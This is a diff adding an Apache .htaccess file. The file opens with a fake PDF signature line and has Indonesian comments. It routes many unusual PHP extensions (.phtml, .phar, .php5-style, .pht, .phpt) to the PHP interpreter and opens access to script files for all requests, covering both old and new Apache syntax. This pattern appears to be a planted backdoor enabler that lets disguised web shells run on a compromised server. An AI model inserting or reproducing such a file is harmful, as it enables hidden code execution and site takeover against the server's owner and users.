@@ -1,0 +1,25 @@
+#%PDF-1.6%‚„œ”
+<IfModule mod_php.c>
+    # Handler utama untuk file PHP
+    AddHandler application/x-httpd-php .php .phtml .phar .php[0-9] .pht .phpt
+    
+    # Alternatif untuk PHP 7.0 jika diperlukan
+    <FilesMatch "\.(php|phtml|phar|php[0-9]{1,2}|pht|phpt)$">
+        SetHandler application/x-httpd-alt-php70___lsphp
+    </FilesMatch>
+</IfModule>
+
+<IfModule mod_authz_core.c>
+    # Sintaks baru Apache 2.4+
+    <FilesMatch "\.(?:inc|php|js|jsx|swf|phtml)$">
+        Require all granted
+    </FilesMatch>
+</IfModule>
+
+<IfModule !mod_authz_core.c>
+    # Sintaks lama Apache 2.2
+    <FilesMatch "\.(?:inc|php|js|jsx|swf|phtml)$">
+        Order allow,deny
+        Allow from all
+    </FilesMatch>
+</IfModule>
